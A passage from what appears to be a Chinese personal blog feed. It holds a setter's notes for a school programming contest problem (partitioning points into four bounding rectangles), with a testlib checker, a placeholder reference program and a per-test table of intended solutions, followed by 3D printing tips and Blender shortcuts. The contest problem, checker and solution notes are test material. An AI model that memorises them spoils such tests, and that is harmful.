href="https://zhuanlan.zhihu.com/p/153549090">https://zhuanlan.zhihu.com/p/153549090</a></p><hr><h1>B2. ???</h1><h1>B2. ???</h1><p>用做比赛赛题,题面不可公开.</p><hr><h1>E. Neko and P Problems</h1><h1>E. 猫猫与多项式问题</h1><p>猫猫找到了一道暴搜题,祂觉得太简单了,于是摇了摇尾巴把问题丢给了你.</p><p>你有 $n$ 个点和四个集合,你需要把所有点分到四个集合中,每个集合可以为空.我们定义一个集合周长的大小为一个最小的长和宽平行笛卡尔坐标系(直角坐标系)的,包含所有点(点可以在边界上)的最小矩形的周长大小,您需要对点进行合理分配,最小化四个集合周长大小的和.</p><h2 id="输入格式-2">输入格式</h2><p>第一行一个整数 $n$ ,表示有多少个点.<br>第 $2$ 行至第 $n$ 行,一行两个整数 $x_i\quad y_i$ ,代表点 $(x_i,y_i)$ 的坐标.</p><h2 id="输出格式-2">输出格式</h2><p>一行 $n$ 个整数,表示某点所在集合.</p><h2 id="样例输入-输出-2">样例输入/输出</h2><p><strong>输入#1</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">0 0</span><br><span class="line">10 0</span><br><span class="line">0 10</span><br><span class="line">10 10</span><br><span class="line">2 4</span><br></pre></td></tr></table></figure><p><strong>输出#1</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 2 3 4 1</span><br></pre></td></tr></table></figure><p><strong>样例解释</strong> :根据给定的坐标画图,找到周长最小的集合如下.</p><p><img src="https://cdn.luogu.com.cn/upload/image_hosting/zvlrhsni.png" alt=""></p><h2 id="说明-提示">说明/提示</h2><p>设点数为 $n$ ,值域 $w$ 表示所有点坐标取值都会在 $[-w,w]$ 内,点有可能出现重合情况,集合的矩形只需要包含所有点就行,点在边界以及矩形的长或宽都可以为0.</p><table><thead><tr><th style="text-align:center">测试点编号</th><th style="text-align:center">n的大小</th><th style="text-align:center">值域大小</th></tr></thead><tbody><tr><td style="text-align:center"><code>1</code></td><td style="text-align:center">$5$</td><td style="text-align:center">$10$</td></tr><tr><td style="text-align:center"><code>2</code></td><td style="text-align:center">$6$</td><td style="text-align:center">$10$</td></tr><tr><td style="text-align:center"><code>3</code></td><td style="text-align:center">$7$</td><td style="text-align:center">$10^9$</td></tr><tr><td style="text-align:center"><code>4</code></td><td style="text-align:center">$8$</td><td style="text-align:center">$10^9$</td></tr><tr><td style="text-align:center"><code>5</code></td><td style="text-align:center">$9$</td><td style="text-align:center">$10^9$</td></tr><tr><td style="text-align:center"><code>6</code></td><td style="text-align:center">$10$</td><td style="text-align:center">$10^9$</td></tr><tr><td style="text-align:center"><code>7</code></td><td style="text-align:center">$10$</td><td style="text-align:center">$10^9$</td></tr><tr><td style="text-align:center"><code>8</code></td><td style="text-align:center">$15$</td><td style="text-align:center">$10^9$</td></tr><tr><td style="text-align:center"><code>9</code></td><td style="text-align:center">$15$</td><td style="text-align:center">$10^9$</td></tr><tr><td style="text-align:center"><code>10</code></td><td style="text-align:center">$16$</td><td style="text-align:center">$10^9$</td></tr><tr><td style="text-align:center"><code>11</code></td><td style="text-align:center">$16$</td><td style="text-align:center">$10^9$</td></tr><tr><td style="text-align:center"><code>12</code></td><td style="text-align:center">$20$</td><td style="text-align:center">$10^9$</td></tr><tr><td style="text-align:center"><code>13</code></td><td style="text-align:center">$20$</td><td style="text-align:center">$10^9$</td></tr><tr><td style="text-align:center"><code>14</code></td><td style="text-align:center">$100$</td><td style="text-align:center">$10$</td></tr><tr><td style="text-align:center"><code>15</code></td><td style="text-align:center">$100$</td><td style="text-align:center">$20$</td></tr><tr><td style="text-align:center"><code>16</code></td><td style="text-align:center">$100$</td><td style="text-align:center">$50$</td></tr><tr><td style="text-align:center"><code>17</code></td><td style="text-align:center">$100$</td><td style="text-align:center">$10^9$</td></tr><tr><td style="text-align:center"><code>18</code></td><td style="text-align:center">$100$</td><td style="text-align:center">$10^9$</td></tr><tr><td style="text-align:center"><code>19</code></td><td style="text-align:center">$100$</td><td style="text-align:center">$10^9$</td></tr><tr><td style="text-align:center"><code>20</code></td><td style="text-align:center">$100$</td><td style="text-align:center">$10^9$</td></tr></tbody></table><p><strong>注意</strong> :本题采用 <code>Special Judge</code> 和 <em>动态赋分制</em> ,您的程序会在评测后得到一个分数,代表您的程序得到的最小周长.我们会使用与第一名的周长进行比较的公式进行评估,您会得到一个得分,这里还没写完…</p><p>参考程序(你可以使用参考程序提交并得分,只是后面会被比下去):</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/atsc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;++i)&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;1 &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考资料-附件">参考资料(附件)</h2><p>Neko_and_NPC_Problems.zip</p><hr><h1>出题者语</h1><p>暴搜 $O(4^n)$<br>枚举值域 $O(nw^{12})$ (枚举三个正方形的值域,然后剩下的归到最后的集合里面,On检查,加一块就是这个)<br>模拟退火 $O(玄学)$ 答案玄学,快速剪枝( <s>青云杯退火大赛</s> )</p><p><strong>有一个不太好的地方是,因为四个集合,计算机速率达不到,枚举值域虽然复杂度在值域小的时候很可以但是这个时候人类智慧会杀出来的,也许3个集合会更好?但是这样的话暴搜又会杀出来…所以枚举值域只能结合人类智慧一起做.</strong></p><p><strong>还有一个问题,这个题的答案搞不出来的情况下,模拟退火打的怎么样?别到时候退火变成除了暴搜出的正解外吊打选手的程序(包括标算,虽然可能没有标算),一定要卡死模拟退火,至少别让模拟退火太逆天…</strong></p><table><thead><tr><th style="text-align:center">测试点编号</th><th style="text-align:center">点的规模</th><th style="text-align:center">值域规模</th><th style="text-align:center">预期解法</th><th style="text-align:center">描述一下图的性质</th></tr></thead><tbody><tr><td style="text-align:center"><code>1</code></td><td style="text-align:center">$5$</td><td style="text-align:center">$10$</td><td style="text-align:center">白给,因为至少四个集合,所以怎么着也得五个起拍</td><td style="text-align:center">特殊数字(114514之类的)</td></tr><tr><td style="text-align:center"><code>2</code></td><td style="text-align:center">$6$</td><td style="text-align:center">$10$</td><td style="text-align:center">白给</td><td style="text-align:center">随机</td></tr><tr><td style="text-align:center"><code>3</code></td><td style="text-align:center">$7$</td><td style="text-align:center">$10^9$</td><td style="text-align:center">人类智慧</td><td style="text-align:center">随机</td></tr><tr><td style="text-align:center"><code>4</code></td><td style="text-align:center">$8$</td><td style="text-align:center">$10^9$</td><td style="text-align:center">开始暴搜/人类智慧</td><td style="text-align:center">随机</td></tr><tr><td style="text-align:center"><code>5</code></td><td style="text-align:center">$9$</td><td style="text-align:center">$10^9$</td><td style="text-align:center">开始暴搜/人类智慧</td><td style="text-align:center">随机</td></tr><tr><td style="text-align:center"><code>6</code></td><td style="text-align:center">$10$</td><td style="text-align:center">$10^9$</td><td style="text-align:center">暴搜</td><td style="text-align:center">随机</td></tr><tr><td style="text-align:center"><code>7</code></td><td style="text-align:center">$10$</td><td style="text-align:center">$10^9$</td><td style="text-align:center">暴搜</td><td style="text-align:center">随机</td></tr><tr><td style="text-align:center"><code>8</code></td><td style="text-align:center">$15$</td><td style="text-align:center">$10^9$</td><td style="text-align:center">打表</td><td style="text-align:center">随机</td></tr><tr><td style="text-align:center"><code>9</code></td><td style="text-align:center">$15$</td><td style="text-align:center">$10^9$</td><td style="text-align:center">打表</td><td style="text-align:center">随机</td></tr><tr><td style="text-align:center"><code>10</code></td><td style="text-align:center">$16$</td><td style="text-align:center">$10^9$</td><td style="text-align:center">人类智慧+暴搜</td><td style="text-align:center">随机</td></tr><tr><td style="text-align:center"><code>11</code></td><td style="text-align:center">$16$</td><td style="text-align:center">$10^9$</td><td style="text-align:center">人类智慧+暴搜</td><td style="text-align:center">随机</td></tr><tr><td style="text-align:center"><code>12</code></td><td style="text-align:center">$20$</td><td style="text-align:center">$10^9$</td><td style="text-align:center">人类智慧+暴搜</td><td style="text-align:center">随机</td></tr><tr><td style="text-align:center"><code>13</code></td><td style="text-align:center">$20$</td><td style="text-align:center">$10^9$</td><td style="text-align:center">人类智慧+暴搜</td><td style="text-align:center">随机</td></tr><tr><td style="text-align:center"><code>14</code></td><td style="text-align:center">$100$</td><td style="text-align:center">$10$</td><td style="text-align:center">人类智慧+枚举值域</td><td style="text-align:center">随机(事实上也随机不到哪去,值域太小了)</td></tr><tr><td style="text-align:center"><code>15</code></td><td style="text-align:center">$100$</td><td style="text-align:center">$20$</td><td style="text-align:center">人类智慧+枚举值域</td><td style="text-align:center">随机(事实上也随机不到哪去,值域太小了)</td></tr><tr><td style="text-align:center"><code>16</code></td><td style="text-align:center">$100$</td><td style="text-align:center">$50$</td><td style="text-align:center">人类智慧+枚举值域</td><td style="text-align:center">青云杯标识(正解是通过把图像竖着或者横着劈成四瓣,省掉中间的间隙的周长)</td></tr><tr><td style="text-align:center"><code>17</code></td><td style="text-align:center">$100$</td><td style="text-align:center">$10^9$</td><td style="text-align:center">人类智慧</td><td style="text-align:center">(点的分布会很密集,但是四个集合之间离的很远)四坨点聚在四周</td></tr><tr><td style="text-align:center"><code>18</code></td><td style="text-align:center">$100$</td><td style="text-align:center">$10^9$</td><td style="text-align:center">人类智慧</td><td style="text-align:center">三坨,长成两个点和一个8的样子</td></tr><tr><td style="text-align:center"><code>19</code></td><td style="text-align:center">$100$</td><td style="text-align:center">$10^9$</td><td style="text-align:center">不可做,依赖玄学剪枝(模拟退火???)</td><td style="text-align:center">随机,可能有重合点</td></tr><tr><td style="text-align:center"><code>20</code></td><td style="text-align:center">$100$</td><td style="text-align:center">$10^9$</td><td style="text-align:center">不可做,依赖玄学剪枝(模拟退火???)</td><td style="text-align:center">随机,可能有重合点</td></tr></tbody></table><hr><p>文件 <code>E_checker.cpp</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;testlib.h&quot;</span></span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">int</span> infin=<span class="number">2147483647</span>;</span><br><span class="line"><span class="comment">//答案文件和输入文件保持一致,因为其实这个题本没有答案的( )</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span></span>&#123;</span><br><span class="line"><span class="built_in">setName</span>(<span class="string">&quot;E_checker&quot;</span>);</span><br><span class="line"><span class="built_in">registerTestlibCmd</span>(argc,argv);</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> mx1x=-infin,mn1x=infin,mx1y=-infin,mn1y=infin,cnt1=<span class="number">0</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> mx2x=-infin,mn2x=infin,mx2y=-infin,mn2y=infin,cnt2=<span class="number">0</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> mx3x=-infin,mn3x=infin,mx3y=-infin,mn3y=infin,cnt3=<span class="number">0</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> mx4x=-infin,mn4x=infin,mx4y=-infin,mn4y=infin,cnt4=<span class="number">0</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> n=ans.<span class="built_in">readInt</span>(),tmp,tmpx,tmpy;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;++i)&#123;</span><br><span class="line">tmp=ouf.<span class="built_in">readInt</span>();</span><br><span class="line">tmpx=ans.<span class="built_in">readInt</span>();</span><br><span class="line">tmpy=ans.<span class="built_in">readInt</span>();</span><br><span class="line"><span class="keyword">switch</span>(tmp)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:&#123;</span><br><span class="line">cnt1++;</span><br><span class="line">mx1x=std::<span class="built_in">max</span>(mx1x,tmpx);</span><br><span class="line">mn1x=std::<span class="built_in">min</span>(mn1x,tmpx);</span><br><span class="line">mx1y=std::<span class="built_in">max</span>(mx1y,tmpy);</span><br><span class="line">mn1y=std::<span class="built_in">min</span>(mn1y,tmpy);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;<span class="keyword">case</span> <span class="number">2</span>:&#123;</span><br><span class="line">cnt2++;</span><br><span class="line">mx2x=std::<span class="built_in">max</span>(mx2x,tmpx);</span><br><span class="line">mn2x=std::<span class="built_in">min</span>(mn2x,tmpx);</span><br><span class="line">mx2y=std::<span class="built_in">max</span>(mx2y,tmpy);</span><br><span class="line">mn2y=std::<span class="built_in">min</span>(mn2y,tmpy);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;<span class="keyword">case</span> <span class="number">3</span>:&#123;</span><br><span class="line">cnt3++;</span><br><span class="line">mx3x=std::<span class="built_in">max</span>(mx3x,tmpx);</span><br><span class="line">mn3x=std::<span class="built_in">min</span>(mn3x,tmpx);</span><br><span class="line">mx3y=std::<span class="built_in">max</span>(mx3y,tmpy);</span><br><span class="line">mn3y=std::<span class="built_in">min</span>(mn3y,tmpy);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;<span class="keyword">case</span> <span class="number">4</span>:&#123;</span><br><span class="line">cnt4++;</span><br><span class="line">mx4x=std::<span class="built_in">max</span>(mx4x,tmpx);</span><br><span class="line">mn4x=std::<span class="built_in">min</span>(mn4x,tmpx);</span><br><span class="line">mx4y=std::<span class="built_in">max</span>(mx4y,tmpy);</span><br><span class="line">mn4y=std::<span class="built_in">min</span>(mn4y,tmpy);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;<span class="keyword">default</span>:&#123;</span><br><span class="line"><span class="built_in">quitf</span>(_wa,<span class="string">&quot;%lld&quot;</span>,inf);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> res=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(cnt1!=<span class="number">0</span>)res+=(mx1x-mn1x+mx1y-mn1y)&lt;&lt;<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(cnt2!=<span class="number">0</span>)res+=(mx2x-mn2x+mx2y-mn2y)&lt;&lt;<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(cnt3!=<span class="number">0</span>)res+=(mx3x-mn3x+mx3y-mn3y)&lt;&lt;<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(cnt4!=<span class="number">0</span>)res+=(mx4x-mn4x+mx4y-mn4y)&lt;&lt;<span class="number">1</span>;</span><br><span class="line"><span class="built_in">quitf</span>(_ok,<span class="string">&quot;%lld&quot;</span>,res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1>E2. 九井棋</h1><h1>E2. Tic-Tac Toe</h1><p>选手两两之间下九井棋,比拼谁赢的多的这么一个题,对评测姬要求比较高.</p><hr><h1>以及一些没有实现的idea</h1><p>因为能力不足或时间不够,没有将想法落地的ideas.</p><ol><li><p>(交互题)给一个01串,选手任意对字符串进行编码,或者进行计算,然后我们进行破坏之后再还给选手,看是否能够还原,还原率是多少,涉及到很复杂的差错控制编码:喷泉码,李德所罗门码(二维码用的那个,能达到30%纠错率)</p></li><li><p>手写一个malloc看谁性能最好,受制于评测姬是Linux只好作罢.</p></li><li><p>Markov Algorithm Online(整一个类似旷野大计算类似的东西)</p></li><li><p>因为程序最终是要被编译成机器码执行的,所以我们让选手使用汇编去实现一个类似&quot;旷野大计算&quot;的题,然后转成机器码交上去,也就是说选手需要提交一堆数字,然后由SPJ负责把数字转成程序运行,不可以出现任何数字空格以外的输入,idea来自<a href="https://www.bilibili.com/video/BV16P4y1C7T9">这个视频</a></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;无论如何,Flu不会再出题了.&lt;/strong&gt; 出题得不到什么奖励,出不好还会被骂,出题的时候要考虑各种情况(比如正解,代码长度,时限到底开多少,部分分怎么给,怎么卡掉非正解,可能有什么做法能草过去),还有人不干活,团委整天拖报销咋办…&lt;/p&gt;
&lt;p&gt;所以</summary>
      
    
    
    
    <category term="ACM" scheme="https://narafluorine.github.io/categories/ACM/"/>
    
    
    <category term="Contest" scheme="https://narafluorine.github.io/tags/Contest/"/>
    
    <category term="TsingyunCup" scheme="https://narafluorine.github.io/tags/TsingyunCup/"/>
    
  </entry>
  
  <entry>
    <title>3D打印,建模,工学</title>
    <link href="https://narafluorine.github.io/2024/12/24/30012_3D%E6%89%93%E5%8D%B0%E5%8F%8A%E5%BB%BA%E6%A8%A1/"/>
    <id>https://narafluorine.github.io/2024/12/24/30012_3D%E6%89%93%E5%8D%B0%E5%8F%8A%E5%BB%BA%E6%A8%A1/</id>
    <published>2024-12-24T13:03:22.000Z</published>
    <updated>2025-08-29T06:52:53.300Z</updated>
    
    <content type="html"><![CDATA[<h2 id="3D打印文件格式有哪些">3D打印文件格式有哪些?</h2><p><code>stl</code> <code>3mf</code> <code>amf</code> <code>obj</code> 等.</p><h2 id="ref">ref</h2><p>PLA需要后处理层纹，打磨有粗磨、湿磨（可以用电动威克斯老鼠砂打磨大面积）、刷丙酮亚克力胶、上牙膏灰补土、水补，再反复精细打磨补喷、喷漆上色、上水性保护器比如易刷刷，处理完表面其实就是高分子树脂了，面材结实而里面是PLA还是别的什么一点都不重要了，相当于鸡蛋白外面挂一层牢固的鸡蛋壳。不拿去打砸，放个十来年应该一点问题没有。还想进一步，你可以翻模，搞AB树脂或硬石膏长久保存。</p><h2 id="AMS怎么省钱封箱">AMS怎么省钱封箱?</h2><p>使用自带的塑料袋加扎带即可.</p><h2 id="老三样">老三样?</h2><p>打磨 补土 电镀</p><h2 id="工件向上最大倾斜度">工件向上最大倾斜度</h2><p>还没测.</p><h2 id="打印件六边形悬垂处有单向毛刺-怎么回事">打印件六边形悬垂处有单向毛刺,怎么回事?</h2><p>可能是润滑轴不到位导致,或降低打印速度,或加强散热风扇风速或烘干耗材</p><h2 id="牌子">牌子</h2><p>兰博(Flu用的)<br>Jayo(听说是三绿换牌子走的低端市场,应该挺好使的)</p><h2 id="用平面打印板时出现齐整的鱼鳞纹-底面-是什么事情">用平面打印板时出现齐整的鱼鳞纹(底面)是什么事情?</h2><p>没调平好.</p><h2 id="工件名称">工件名称??</h2><p>方钢 方管</p><h2 id="另一种玩法">另一种玩法</h2><p>在连接分件的时候用电烙铁压一圈小金属条或者订书钉进去,然后再补土刮腻子打磨喷涂</p><h2 id="无AMS多色打印">无AMS多色打印</h2><p>原理:可以把工件纵向切开,中间插入缓冲层,然后换料,然后继续打印就可以实现无AMS的多色打印.</p><p>然而实操的时候有一个坑就是,右边能拖动的条能插暂停层的是当前准备打第几层, <strong>但是</strong> 左边的模型显示是打完第几层之后的状态.比如你要打一个名字扣,板子10层,名字10层凸显在上面,你需要在第11层加暂停层.</p><h2 id="打印板">打印板</h2><p><img src="https://cdn.luogu.com.cn/upload/image_hosting/ny20ngui.png" alt=""></p><p>上面光鲜亮丽的那个板子会因为光栅效应导致打印出来的物品也可以让光色散,底座五颜六色反光的效果.</p><h2 id="塑钢线">塑钢线</h2><p>塑钢线是一种农用物品,用于户外拉遮阳棚等用的东西,材质是PE,听说能够用于3D打印,Flu买来试验一下,(59元是9斤,这种13元一千克的耗材如果能成功打印工件的话直接耗材自由了),所以Flu必须实验.</p><p>首先,因为白色塑钢线透明,所以不能用拓竹的自动流量校准.</p><p>打印速度一定要慢,群U说最大速度体积是8.</p><p>为什么有的时候能挤出有的时候不能挤出?</p><h3 id="为什么黑色塑钢线不能打印">为什么黑色塑钢线不能打印?</h3><p>网上说,黑色塑钢线会粘床,严重的会清理不干净废板子,因为黑色是室外用的,添加抗紫外线耐晒抗老化的东西,并不是垃圾料.</p><h2 id="打印浮雕">打印浮雕</h2><p>先转成灰度图,然后上传到网站转成stl,然后直接打印就行了.</p><p>注意有些人物的笑容会因为灰度不够被抹掉,这个时候一定要看清楚会不会被抹掉…(比方说红叶这个浮雕就是笑容不明显然后打印出来的笑容甚至断开成两半了…)</p><p>可以使用makerlab或者<a href="https://3dp.rocks/">这个网站</a>在线转浮雕.</p><h2 id="克重数据">克重数据</h2><p>对于Flu PETG这种材质,密度基本准确.记录表:</p><table><thead><tr><th style="text-align:center">预估重量(拓竹切片软件,g)</th><th style="text-align:center">实际重量(g)</th></tr></thead><tbody><tr><td style="text-align:center">109.94</td><td style="text-align:center">108.3</td></tr></tbody></table><p>一卷兰博全新耗材重量(1kg,刚开封,算上卷的重量):1167.0g<br>兰博空盘重量:160.0g</p><h2 id="Pending">Pending</h2><p>竹子CHT三孔铬锆铜喷嘴0.2mm(一个喷嘴才三块钱).</p><p>耗材种类:<br>pla petg tpu (abs asa  pa pc) pet</p><p>激光金属3d打印  cnc</p><blockquote><p>据说耗材生意十分赚钱,除了竹子价格死硬,其他厂商都喜欢搞价格歧视,某些时间可能优惠幅度巨大,日常高价收割耗材不敏感客户,优惠时收割价格敏感客户,最后在特殊渠道收割铁公鸡客户,一定要注意,价格是由供需决定的,而不是成本.</p></blockquote><p>BMCU多色系统</p><h2 id="一种论调">一种论调</h2><p>水分在高分子熔融加工中，虽然通常是不利因素，会使材料降解，变脆等等。但是从另一角度来说，水分可以作为一种“增塑剂&quot;。水分可以削弱聚合物分子间的作用力，一定程度上降低熔融温度和玻璃化温度，减小熔体的粘度。说人话，吸潮的耗材在相同温度流量参数下，具有更高的流动性，实际挤出量往往更高，可以称一下打印样条的质量，看看吸潮的耗材打印的样条是不是比干燥的耗材更重。然后烘干后再秤一下.看看重量变化大不大，如果变化不大，就能够说明挤出了更多的耗材，水分的&quot;恶化&quot;作用和&quot;增速作用&quot;达到了一种抵消，所以结果差距不大。另外就是这几种材料吸湿率总体不高，应该测尼龙,那是真要命</p><h2 id="耗材干燥">耗材干燥</h2><p>干燥剂选项:</p><ol><li>分子筛干燥剂(大约3~5元每斤)</li><li>变色硅胶干燥剂</li><li>生石灰(灰太大)</li></ol><p>设备选项:</p><ol><li>大的带密封的盒子</li><li>精密仪器干燥柜</li><li>碗筷消毒柜</li></ol><p>耗材要求:</p><ol><li>PA类的肯定要放干燥箱,而且是开箱立马放干燥箱(最好保存湿度15%以下)</li></ol><h2 id="如何拆支撑">如何拆支撑</h2><p>你就是缺尖嘴钳和锉刀,别的没了.</p><h2 id="为什么XX">为什么XX?</h2><ol><li>为什么会听到咔咔的声音?是打印机撞到模型了吗?</li></ol><p>那是打印机打较大模型时,模型中间会凉下来,然后支撑脱落时发出的声音.</p><ol start="2"><li>支撑为什么一掰就掉</li></ol><p>因为支撑是一整根完整的空柱子,叠起来长得像一棵树.支撑在与模型连接的地方是一堆点,减小在这里的强度,所以支撑很好掰,掰掉的地方会留下点作为痕迹,用砂纸打磨也许能做好.</p><ol start="3"><li>为什么材料还没打几层就破了个大洞?是不是局部受热不均?</li></ol><p>答:你没有洗板子,之前的油沾到了上面导致不粘板子,然后就导致打印一层比一层偏最后出现大洞.所以 <strong>推荐每次打印完取下来模型就洗一次板子,保证下次打印的成功率</strong> .还有可能是耗材时间长了.</p><ol start="4"><li>为什么不着床!!!(翘边,炒面)</li></ol><p>因为热床不粘.对于纹理PIE板使用肥皂洗一下,然后再用无纺布擦干(注意不能是纸巾,会残留碎屑在上面导致打印失败),无纺布可以带酒精也可以不带.不粘平台解决办法1是好好洗洗,2是调节喷头距离,3就是用胶棒</p><ol start="5"><li>硅胶干燥剂的活性恢复方法:建议4次回温之后扔掉硅胶.放入铝箔盒中放到烤箱中100度,每5min拿出来观察硅胶情况并搅拌,约30min,直到不含水分,或者暴晒直到颜色回来.</li></ol><h2 id="上色">上色</h2><p>三种方案:</p><ol><li>直液式丙烯马克笔(先上色,再平涂,最后用光油固定)</li><li>补土打底+手涂水性漆(Flu选择这个,星影和酋长大陆,)+湿盘(水+烘培油纸,).</li><li>丝绸金(这种本身颜色足够鲜艳的)PLA</li></ol><h1>灵感收集</h1><p>买了打印机之后总要打点什么…所以需要收集灵感,免得打印机过度吃灰导致出问题.</p><h2 id="通配符类">通配符类</h2><p>温度塔:看拉丝情况决定打印温度的<br>回抽塔:看拉丝情况决定回抽长度最小是多少的<br>针织模型:什么都有,顶部经常出现扎手的刺,此时需要调整回抽速度或回抽高度(一般是调高点),温度也要适当调一下.针织模型属于单色打也很好看的东西,比较理想.</p><h2 id="中看不中用类">中看不中用类</h2><p>福字挂件,窗花剪纸<br>透明材料打印海豚(内嵌的)(要看透明PETG打印技巧wiki)<br>六边形搁物架,用嵌子卡在两个中间保证不散.<br>任意浮雕,先扔ps里转灰度图,然后扔<br>任意名字挂件,简单的图片</p><h2 id="实用类">实用类</h2><p>印章()<br>发夹(多色无需ams)</p><h2 id="如何变现">如何变现?</h2><ol><li>拓竹发布模型收获赞助变现</li><li>扎根行业提出解决方案等别人复刻</li><li>卷代打</li><li>摆地摊,</li></ol><h1>色彩</h1><ol><li>绿色士兵小人</li><li></li></ol><h1>Blender建模教程</h1><hr><p>(听的KurTips网课,简单学了一手)</p><h3 id="键位">键位</h3><p>鼠标中键:挪动视角,观察空间<br>Shift+鼠标中键:移动空间(右上角小手)<br>滚轮:缩放空间(右上角的放大镜)<br>右上角的三色轴拖动旋转:转动空间<br>摄像机视图:右上角摄像机<br>正交视图:右上角网格</p><p>删除物体:Del<br>恢复操作:Ctrl+Z新建物体:Shift+a<br>移动物体:G(这个状态按xyz会沿着对应方向移动),退出状态是左键<br>缩放物体:S(这个状态按xyz会沿着对应方向移动),退出状态是左键<br>旋转物体:R(按xyz会沿着对应方向移动,默认是你的视图方向旋转),退出状态是左键<br>隐藏物体:H(Shift+H会隐藏所有没有被选中的物体,看右上角场景那里的小眼睛)<br>恢复某些性质:Alt+X(加S撤销缩放,加R撤销旋转,加G撤销位移(回到原先的位置了))<br>复制物体:Shift+D移动并复制(复制并移动是两步,撤销的时候会发现其实已经复制出来了)</p><p>选中:分为框选(不可调位置)和单选(随便调位置)还有刷选(快捷键C,刷到哪里选择哪里)和套索(从鼠标末端到鼠标起点的一个闭合平面),在鼠标框那里长按调整,注意要选到物体中心才算</p><p>切换视图:单击XYZ轴可以变换成单方向的视图.<br>还有一种方法: <code>~</code> 进入Tab目录,显示当前的视图小键盘福利:1正视图3右视图7顶视图9把当前视图反过来<br>2468是上下左右方向的微调(一次15度)</p><p>面板:每一个面板都可以转换成其他的操作面板.面板转换在左上角.可替换可拆分,鼠标在窗口四角出现加号的时候可以拉,往别的窗口拉会合并,往自己的窗口拉会分裂.</p><p>搞乱了可以在上方加号新建布局恢复.<br>Ctrl+Space可以最大化当前面板,再按一次恢复.</p><p>键盘上的/斜杠:按一下可以让选中的物体单独显示,再按一下退出.</p><p>0:进入摄像机视图</p><p>摄像机快速对正:在摄像机视图按n勾选锁定摄像机,然后就可以直接在摄像机视图调整了.</p><p>blender有两个渲染器,一个叫eevee,一个叫cycles.eevee是实时渲染,快,相对不占资源,缺点是没有光线追踪,很多光线阴影细节不佳,需要额外更多参数辅助.cycles更加逼真高级,能模拟出物理世界里非常细节的光线阴影,缺点是慢,比eevee慢10倍以上.`</p><h3 id="游标">游标</h3><p>游标在哪里,新建的东西就会出现在哪里.</p><p>移动游标:选中工具下面是游标工具,点这个工具移动即可.<br>或者正常的选中模式,Shift+右键 也可以移动游标.<br>Shift+C 游标回到原点.</p><p>游标可以当成轴心点用.把物体的轴心点换成游标的话,就可以绕着游标进行转动.</p><h3 